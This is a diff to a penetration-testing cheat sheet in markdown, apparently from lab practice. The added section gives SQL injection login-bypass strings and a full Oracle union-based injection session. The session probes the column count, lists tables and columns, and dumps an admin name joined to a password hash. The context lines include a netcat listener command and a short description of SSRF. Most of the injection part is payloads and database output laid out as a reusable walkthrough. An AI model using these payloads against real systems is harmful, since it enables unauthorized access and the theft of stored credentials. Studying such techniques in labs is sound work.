@@ -189,7 +189,7 @@ nc -nlvp 80
 ````
 ### SQL Injection
 Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
-### Research Repo MariaDB
+#### Research Repo MariaDB
 <img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />
 
 ````
@@ -197,6 +197,45 @@ admin ' OR 1=1 --
 ````
 ````
 1' OR 1 = 1#
+````
+#### Oracle DB bypass login
+````
+admin ' OR 1=1 --
+````
+#### Oracle DB dumping creds
+````
+https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
+````
+````
+' 
+Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
+' OR 1=1 -- 
+Blog entry from Chris with title The Great Escape from 2017
+Blog entry from Bob with title I Love Crypto from 2016
+Blog entry from Alice with title Man-in-the-middle from 2018
+Blog entry from Chris with title To Paris and Back from 2019
+Blog entry from Maria with title Software Development Lifecycle from 2018
+Blog entry from Eric with title Accounting is Fun from 2019
+' union select 1,2,3,4,5,6--
+java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
+ ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
+java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
+ ' union select 1,2,3 from dual-- #adjusted columns
+java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
+ ' union select null,null,null from dual--
+Blog entry from null with title null from 0
+' union select user,null,null from dual--
+Blog entry from WEB_APP with title null from 0
+' union select table_name,null,null from all_tables--
+Blog entry from WEB_ADMINS with title null from 0
+Blog entry from WEB_CONTENT with title null from 0
+Blog entry from WEB_USERS with title null from 0
+' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'--
+Blog entry from ADMIN_ID with title null from 0
+Blog entry from ADMIN_NAME with title null from 0
+Blog entry from PASSWORD with title null from 0
+' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS--
+Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
 ````
 ### SSRF
 SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
